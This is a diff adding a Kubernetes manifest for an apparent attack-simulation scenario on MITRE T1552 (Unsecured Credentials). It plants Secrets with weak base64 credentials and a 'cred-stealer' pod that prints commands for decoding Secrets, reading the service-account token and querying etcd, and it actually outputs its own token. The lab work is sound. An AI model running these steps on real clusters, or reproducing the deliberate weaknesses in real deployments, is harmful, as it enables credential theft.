@@ -1,0 +1,62 @@
+# KOAD-S26: Unsecured Credentials
+# ATT&CK: T1552 — Unsecured Credentials
+# Attack: Read etcd plaintext Secrets, SA tokens, .docker/config.json
+---
+apiVersion: v1
+kind: Secret
+metadata:
+  name: database-credentials
+  namespace: koad
+  labels:
+    koad-scenario: S26
+    mitre-attck: T1552
+type: Opaque
+data:
+  username: YWRtaW4=
+  password: UEBzc3cwcmQxMjM=
+---
+apiVersion: v1
+kind: Secret
+metadata:
+  name: docker-registry-creds
+  namespace: koad
+  labels:
+    koad-scenario: S26
+type: kubernetes.io/dockerconfigjson
+data:
+  .dockerconfigjson: eyJhdXRocyI6eyJyZWdpc3RyeS5leGFtcGxlLmNvbSI6eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJQQHNzdzByZCIsImF1dGgiOiJZV1J0YVc0NlVFQnpjM2N3Y21RPSJ9fX0=
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: cred-stealer
+  namespace: koad
+  labels:
+    koad-scenario: S26
+spec:
+  serviceAccountName: overprivileged-sa
+  containers:
+    - name: stealer
+      image: bitnami/kubectl:latest
+      command: ["sh", "-c"]
+      args:
+        - |
+          echo "=== KOAD-S26: Unsecured Credentials ==="
+          echo ""
+          echo "Attack 1 — Read Secrets from API:"
+          echo "  kubectl get secrets -n koad -o yaml"
+          echo "  kubectl get secret database-credentials -n koad -o jsonpath='{.data.password}' | base64 -d"
+          echo ""
+          echo "Attack 2 — Read SA token (auto-mounted):"
+          echo "  cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+          echo ""
+          echo "Attack 3 — Read etcd directly (if accessible):"
+          echo "  ETCDCTL_API=3 etcdctl get /registry/secrets/koad/database-credentials"
+          echo ""
+          echo "Attack 4 — Read .docker/config.json:"
+          echo "  kubectl get secret docker-registry-creds -n koad -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d"
+          echo ""
+          echo "Current SA token:"
+          cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "(not mounted)"
+          echo ""
+          sleep infinity
